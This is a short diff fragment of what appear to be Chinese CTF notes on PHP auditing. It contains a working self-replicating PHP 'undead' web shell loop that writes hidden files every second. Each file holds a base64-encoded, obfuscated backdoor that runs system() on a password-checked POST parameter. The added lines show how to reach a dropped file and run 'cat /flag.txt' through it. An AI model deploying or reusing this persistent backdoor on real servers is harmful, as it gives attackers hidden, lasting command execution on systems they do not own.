@@ -33,6 +33,13 @@ date +%s
 ```
 3=while (1){file_put_contents(".".md5(time()).".php",base64_decode("PD9waHAgJGE9InMiLiJ5Ii4ic3QiLiJlbSI7aWYgKG1kNSgkX1BPU1RbMl0pPT09IjEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlIil7JGEoJF9QT1NUWzFdKTt9Pz4K"));sleep(1);};
 ```
+```
+php -r "echo md5(time());";echo
+5fef77c04ea24679d1ab7d7c3b29ffb0
+
+.5fef77c04ea24679d1ab7d7c3b29ffb0.PHP
+POST: 2=v5est0r&1=cat /flag.txt
+```
 
 
 ## php代码审计常用函数
